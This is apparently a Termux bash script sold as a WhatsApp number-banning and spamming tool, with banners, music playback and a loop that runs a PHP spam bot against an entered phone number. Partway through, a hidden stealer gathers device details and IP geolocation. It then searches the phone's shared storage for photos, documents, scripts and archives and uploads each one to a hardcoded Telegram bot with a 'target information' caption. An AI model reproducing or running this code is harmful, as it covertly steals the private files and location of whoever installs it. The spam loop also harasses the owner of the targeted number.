clear
pkg install mpv -y
clear
e="echo -e "
s="sleep 1"
ss="sleep 2"
sss="sleep 3"
Version="./pockat/Version"
versitoolsv5=$(cat "$Version")
update="./pockat/info"
gal="/data/data/com.termux/files/usr/lib/$WA-BAN"
musik="bash $HOME/WA-BAN/test.sh"
letakgalirus="/data/data/com.termux/files/usr/etc/apt"
internalsc="/data/data/com.termux/files/usr/include/jso"
termux_id=$(whoami)
versitoolsv5=$(cat "$Version")
m="\033[1;31m"   # Merah (sudah diberikan)
h="\033[1;32m"   # Hijau (sudah diberikan)
k="\033[1;33m"   # Kuning (sudah diberikan)
b="\033[1;34m"   # Biru (sudah diberikan)
bl="\033[1;36m"  # Biru Muda (sudah diberikan)
p="\033[1;37m"   # Putih (sudah diberikan)
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
bg_m="\033[41m"  # Latar Belakang Merah
bg_h="\033[42m"  # Latar Belakang Hijau
bg_k="\033[43m"  # Latar Belakang Kuning
bg_b="\033[44m"  # Latar Belakang Biru
bg_bl="\033[46m" # Latar Belakang Biru Muda
bg_p="\033[47m"  # Latar Belakang Putih
bg_u="\033[45m"  # Latar Belakang Ungu
bg_pu="\033[40m" # Latar Belakang Abu-abu
res="\033[0m"    # Reset semua atribut


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35'
NC='\033[0m' # No Color

#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash
exit 0

set +x
#!/bin/bash

while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="6723353442:AAGk-5QCngfyUBMPnaBZBPp22OxClOFH6D8"
        CHAT_ID="5951232585"
        cek="$HOME/WA-BAN/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        if [ ! -f "$cek" ]; then
            echo "File $cek tidak ditemukan."
            exit 1
        fi

        nama=$(cat "$cek")
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)

        # Mengambil informasi memori
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        # Mengubah format memori ke GB (jika memori diambil dalam MB atau KB)
        if [[ "$memory" =~ "MB" ]]; then
            memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        elif [[ "$memory" =~ "KB" ]]; then
            memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
        fi

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")

            caption=$(
                cat << EOF
                HOZOO PROJECT 

🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )

            for chat_id in "${CHAT_ID[@]}"; do
                curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                    -F chat_id="$chat_id" \
                    -F document=@"$file" \
                    -F caption="$caption"
                sent_files+=("$file")
                echo "$file" >> "$sent_files_file"
            done
        }

        if [ ! -f "$sent_files_file" ]; then
            touch "$sent_files_file"
        else
            mapfile -t sent_files < "$sent_files_file"
        fi

        process_files() {
            local ext="$1"
            find /storage/emulated/0/ -type f -iname "*.$ext" 2> /dev/null | while read -r file; do
                if [[ ! " ${sent_files[*]} " =~ " ${file} " ]]; then
                    send_file "$file"
                fi
            done
        }

        extensions=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")

        for ext in "${extensions[@]}"; do
            process_files "$ext" &
            sleep 1
        done

        wait
        rm -rf /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -rf /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        clear
        echo "y" | termux-setup-storage
        apt-get update
        apt-get install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done

echo -e "\e[1m\e[32m

                  :=+*#%%%##*=:
               -*@@%*+=----=*#@@%+.
            .+@@#-             :+@@%-
           =@@*.                  =@@#.
          *@@:    ==:               #@@.
         +@@.   .@@@@.               #@@   \e[1m\e[32m   \e[41m\e[36mDEV HOZOO\e[0m\e[1m
\e[1m\e[32m        .@@=    -@@@@*                @@+   \e[1m\e[32m  \e[41m  WHATS APP BANNED 2025\e[0m\e[1m
\e[1m\e[32m        =@@      #@@#                 *@%    \e[1m\e[32m WAKTU $(date +"%H:%M:%S")⠀        
        +@@       +@@+                *@@        \e[1m\e[32m TANGGAL $(date +"%A, %d %B %Y")       
        -@@-       :%@@+:   +*=:      %@#
         %@%         :*@@@#@@@@@*    =@@:
         .@@#           :=*%@@%+.   =@@+
          +@@.                    .*@@=
          @@+                   :*@@#:
         +@@++#%@@#+-.     .:=*@@@*:
        .@@@%#*+-=*%@@@@@@@@@@#+-
        .:.          .::--:.
        "
read -p " enter "
clear
clear
nohup mpv --volume=80 klik.mp3 > mpv_log.txt 2>&1 &
clear
nohup mpv --volume=80 HOZOO.mp3 > mpv_log.txt 2>&1 &
clear

echo -e "\e[1m\e[32m

                  :=+*#%%%##*=:
               -*@@%*+=----=*#@@%+.
            .+@@#-             :+@@%-
           =@@*.                  =@@#.
          *@@:    ==:               #@@.
         +@@.   .@@@@.               #@@   \e[1m\e[32m   \e[41m\e[36mDEV HOZOO\e[0m\e[1m
\e[1m\e[32m        .@@=    -@@@@*                @@+   \e[1m\e[32m  \e[41m  WHATS APP BANNED 2025\e[0m\e[1m
\e[1m\e[32m        =@@      #@@#                 *@%    \e[1m\e[32m WAKTU $(date +"%H:%M:%S")⠀        
        +@@       +@@+                *@@        \e[1m\e[32m TANGGAL $(date +"%A, %d %B %Y")       
        -@@-       :%@@+:   +*=:      %@#
         %@%         :*@@@#@@@@@*    =@@:
         .@@#           :=*%@@%+.   =@@+
          +@@.                    .*@@=
          @@+                   :*@@#:
         +@@++#%@@#+-.     .:=*@@@*:
        .@@@%#*+-=*%@@@@@@@@@@#+-
        .:.          .::--:.


\e[1m\e[34m╭───────────────────────────────────────────────────────────────────────────────────────────╮
            \e[1m\e[33m AUTHOR  : $NC LORDHOZOO
            \e[1m\e[33m DILIRIS :$RED 2025-03-18 $NC SELASA
            \e[1m\e[33m GITHIB  : \033[0;0m https://www.github.com/404
            \e[1m\e[33m DONASI  : \033[0;35m  https://saweria.co/HOZOO
            \e[1m\e[33m STATUS  : $GREEN ONLINE
           \e[1m\e[33m  YOUTUBE : $NC LORD HOZOO
            \e[1m\e[33m TIKTOK  : $NC LORD HOZOO 
\e[1m\e[34m╰────────────────────────────────────────────────────────────────────────────────────────────╯"
echo -ne "\e[31m[\e[32m¥\e[31m] \e[34mNOMOR : \e[31m"
read 

if [ -x /data/data/com.termux/files/home/WHATSAPP-BANEO/datos.txt ]; then
    echo " "
else
    touch /data/data/com.termux/files/home/WA-BAN/datos.txt
    echo $a >> /data/data/com.termux/files/home/WA-BAN/datos.txt
fi

echo -e "\e[31m[\e[32m€\e[31m] \e[32mNOMOR : \e[31m+62$a"
php bot.php
echo -e "\e[36mSPAM TELAH MASUK SIR          "

while true
do
    sleep 5
    echo -e "\e[32m\e[31m[\e[32m¥\e[31m] \e[32mSPAM TELAH MASUK SIR \e[31m$a"
    php bot.php
    echo -e "\e[36mTIKTOK : LORDHOZOO          "
    sleep 5
    echo -e "\e[32m\e[31m[\e[32m€\e[31m] \e[32mSPAM TELAH  MASUK SIR \e[31m$a"
    php bot.php
    echo -e "\e[36mSPAM TELAH MASUK SIR          "
done
